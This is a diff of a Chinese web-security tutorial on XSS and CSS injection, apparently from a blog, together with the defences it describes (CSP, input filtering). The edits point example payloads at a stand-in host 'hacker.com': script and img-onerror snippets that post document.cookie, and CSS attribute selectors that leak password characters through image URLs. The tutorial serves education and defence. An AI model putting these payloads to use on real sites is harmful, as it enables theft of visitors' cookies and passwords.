@@ -32,11 +32,11 @@ categories:
 ```html
 你好
 <script>
-  $.post({ url: 'https://example.com', data: document.cookie })
+  $.post({ url: 'https://hacker.com', data: document.cookie })
 </script>
 ```
 
-因为这一段 HTML 被直接插入页面中，任何访问这篇帖子的用户都会中招，导致 Cookie 被发送给恶意网站。
+因为用户贴文被直接插入页面中，任何访问这篇帖子的用户都会中招，导致 Cookie 被发送给恶意网站。
 这种攻击方式简单直观，却很致命。
 
 最初级的防御措施，是禁止任何 `<script>` 标签，但这解决不了问题，黑客可以换一种发帖内容：
@@ -46,14 +46,14 @@ categories:
 <img 
   src="no"
   style="displaye: none;"
-  onerror="$.post({ url: 'https://example.com', data: document.cookie })"
+  onerror="$.post({ url: 'https://hacker.com', data: document.cookie })"
 />
 ```
 
 只需要使用一个 `<img>` 类的标签，赋予一个不存在的资源，这样它的 `onerror` 必定触发，此时只需要把代码写在事件回调中即可。
 虽然攻击方式还是一样的，但是，这种方式就很难防御了，毕竟想识别这种攻击代码比 `<script>` 标签要复杂多了。
 
-此外，markdown 格式因为也支持使用 HTML 标签，所以也存在上述问题，如果相关业务支持 markdown，则也需要注重防御。
+此外，markdown 格式因为也支持使用 HTML 标签，所以也存在上述问题，如果贴文支持 markdown，则也需要注重防御。
 
 <br />
 
@@ -144,14 +144,19 @@ input[value^='1'][type='password'] {
 input[value^='2'][type='password'] {
   background-image: url('https://hacker.com/?input=2');
 }
+
 /* ...各种字符组合 */
+
 input[value^='11'][type='password'] {
   background-image: url('https://hacker.com/?input=11');
 }
+
 /* ...各种字符组合 */
+
 input[value^='112'][type='password'] {
-  background-image: url('https://hacker.com/?input=12');
+  background-image: url('https://hacker.com/?input=112');
 }
+
 /* ...各种字符组合 */
 ```
 
@@ -183,9 +188,9 @@ Content-Security-Policy: img-src 'self' https://example1.com https://example2.co
 
 <br />
 
-看到这里，你可能也意识到了，即使不允许自定义 CSS，只要网站允许用户使用 HTML 标签，那么恶意用户就可能通过在标签中添加 `style="background-image: url(...)"` 这种方式，实现窃取访客的隐私。
+你可能也意识到了，即使不允许自定义 CSS，只要网站允许用户使用 HTML 标签，那么恶意用户就可能通过在标签中添加 `style="background-image: url(...)"` 这种方式，实现窃取访客的隐私。
 
-不过，可以使用 `xss` 来对用户的输入进行安全过滤，这个工具会剔除标签的 `style` 属性，避免出现上述问题。
+同样，也可使用 `xss` 来对用户的输入进行安全过滤，这个工具会剔除标签的 `style` 属性，避免出现上述问题。
 
 
 
@@ -634,7 +639,7 @@ https://chaoshi.detail.tmall.com/item.htm?id=549883938912&skuId=5036416315199
 https://www.baidu.com/?qq-pf-to=pcqq.c2c
 ```
 
-后面的 `qq-pf-to` 就是 QQ 加上的，也就是说，对于网站主而言我们访问的来源就这样被 QQ 给 “暴露” 了。
+后面的 `qq-pf-to` 就是 QQ 加上的，也就是说，我们访问的来源就这样被 QQ 给 “暴露” 了。
 
 <br />
 
